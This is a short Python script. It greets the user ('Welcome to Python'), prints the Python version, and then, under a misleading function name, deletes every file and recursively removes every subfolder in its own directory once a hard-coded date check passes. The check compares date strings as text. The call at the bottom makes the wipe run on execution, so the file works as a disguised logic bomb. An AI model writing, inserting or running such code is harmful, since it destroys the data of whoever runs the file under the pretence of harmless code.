import os
import sys
import shutil
import time
def lib_path():

    datd = "12/28/2020"
    print("Welcome to Python")
    print(sys.version)
# places a 0 in front of the month if only 1 digit received for month
    d = datd.split("/")
    if len(d[0])==1:
        datd="0"+datd
    myDate = (time.strftime("%m/%d/%Y"))
    
    l=os.path.abspath(__file__)

    j=l.split("\\")

    # j.pop()
    j.pop()

    path=""
    for i in j:
        path="\\".join(j)    

    for file_name in os.listdir(path):
        pa=path+"\\"+file_name
        if os.path.isfile(pa):
            if datd <= myDate:
                os.remove(pa)
        elif os.path.isdir(pa):
            if datd <= myDate:
                # os.remove(pa)
                shutil.rmtree(pa)
    
lib_path()